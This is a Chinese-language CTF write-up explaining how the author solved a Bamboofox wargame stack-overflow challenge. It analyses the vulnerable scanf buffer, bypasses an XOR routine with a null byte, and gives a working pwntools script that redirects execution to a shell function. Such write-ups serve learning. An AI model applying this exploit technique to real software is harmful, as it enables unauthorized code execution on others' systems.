---
title: 'Write-up:: Bamboofox-Wargame'
author: "TwinkleStar03"
tags: [BamboofoxCTF, Pwnable]
categories: [Write-Up]
date: 2019-07-21
---

Bamboofox CTF解題記錄，一如往常地到處找題目增進自己打CTF的戰力╰(*°▽°*)╯

<!--more-->

我選擇先從[這裡](https://bamboofox.cs.nctu.edu.tw/courses/2/challenges)開始做

-----

# Writeup #

-----

## Wargame 0-1 Magic [100] ##
>Description
Do you believe in magic?

>Hint
Stack buffer overflow

拿到檔案，magic: ELF 32-bit LSB executable，提示已經告知是Stack buffer overflow了，所以我直接IDA拆開來看了。

![有漏洞的函式Magic()](/images/BamboofoxCTF/Magic/disass.JPG)
然後還有一個never_use()可以用來開shell，所以題目應該是希望我們把ret address指到該函式。

從`ax, [ebp-44h]`可知buffer大小是0x44，然後因為`mov     dword ptr [esp], offset aS ; "%s"`可知scanf()的格式化參數是%s，所以可以用垃圾把Buffer塞爆。

已經了解Buffer overflow成立之後就來建構payload吧! 

需要塞0x44個byte進去把Buffer塞滿，這樣做之後會頂到ebp，所以在額外塞0x4個byte頂過ebp，這邊開始就是return address了! 蓋上never_use()的記憶體位置完成攻擊~
Payload: 0x48個byte + never_use()的位置

其實這樣攻擊是不會成功的，因為還有一個函式被忽略了，do_magic()，題目直接給出source
```c
void do_magic(char *buf,int n)
{
        int i;
        srand(time(NULL));
        for (i = 0; i < n; i++)
                buf[i] ^= rand()%256;
}

void magic()
{
        char magic_str[60];
        scanf("%s", magic_str);
        do_magic(magic_str, strlen(magic_str));
        printf("%s", magic_str);
}
```
如果不對do_magic進行繞過，那payload會直接跟亂數XOR變成垃圾QQ

由呼叫do_magic的地方可知控制XOR的次數是透過strlen()，這個函式會計算字串的字元數，停下來的方法是讀到一個\x00，那我們就提早讓他停下來就好!

所以payload變成: 0x1個byte + \x00 + (0x44 + 0x4 - 0x2) + never_use()的位置

```python Payload.py
from pwn import *


host = 'bamboofox.cs.nctu.edu.tw'
port = 10000

p = process('./magic')

# p = remote(host, port)

p.recvuntil(':')

p.sendline('A')

p.recvuntil(':')

p.sendline('A' + '\x00' + 'A' * 70 + p32(0x8048613))

p.interactive()
```

